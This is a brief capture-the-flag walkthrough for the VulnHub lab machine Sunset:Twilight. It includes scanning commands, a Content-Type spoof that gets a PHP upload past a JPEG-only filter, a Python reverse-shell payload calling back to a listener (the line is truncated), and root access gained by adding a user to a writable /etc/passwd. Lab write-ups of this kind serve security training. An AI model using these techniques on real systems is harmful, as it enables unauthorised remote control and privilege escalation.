


# Sunset:Twilight Walkthrough 

**VulnHub Link:** [Sunset:Twilight](https://www.vulnhub.com/entry/sunset-twilight,512/)
**Difficulty:** Easy
**Release Date:** 16 Jul 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.141
```


## 2.Web Enumeration

```bash
dirb http://192.168.100.141
```

we found /gallery in webpage 

uploaded shell.php but only jpeg files allowed

starting burp ...

Content-Type: image/jpeg
```php
<?php
        echo "<pre>";
        echo `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.14",1234));os.dup2(s.fileno(),0); os.dup2(s.>
        echo "</pre>";
?>
```

before command above , 
```
rlwrap nc -nvlp 1234
```
we got www-data shell 

uploading and executing linpeas.sh 

found out /etc/passwd is writable
```bash
openssl passwd test
```
root1:<write here output>:0:0:root:/root:/bin/bash

su root1
(password : test)

and BINGOO User and Root flag captured
